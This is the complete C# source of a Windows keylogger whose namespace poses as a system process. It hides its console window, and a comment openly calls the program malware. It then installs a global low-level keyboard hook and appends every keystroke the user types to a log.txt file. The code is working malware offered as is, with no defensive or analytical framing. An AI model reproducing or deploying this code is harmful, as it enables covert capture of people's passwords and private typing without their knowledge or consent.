using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace Windows_Local_Host_Process
{
    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13; //ID for low level keyboard hooking
        private const int WM_KEYDOWN = 0x0100;
        const int SW_HIDE = 0;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;//<-- This is REALLY cool.  In C# code can be stored in a pointer.
        private static IntPtr _hookID = IntPtr.Zero;

        /// <summary>
        /// Hides the application then sets up the keyboard hook.
        /// </summary>
        public static void Main()
        {
            var handle = GetConsoleWindow(); //Grabs the console so that I can work with it
            ShowWindow(handle, SW_HIDE); //Nobody gets to see the console because this is malware.

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /// <summary>
        /// This is the callback that does all of the work once a key is pressed.
        /// TODO: Add text parsing.
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Dll imports for all of the Microsoft function needed.
        /// </summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
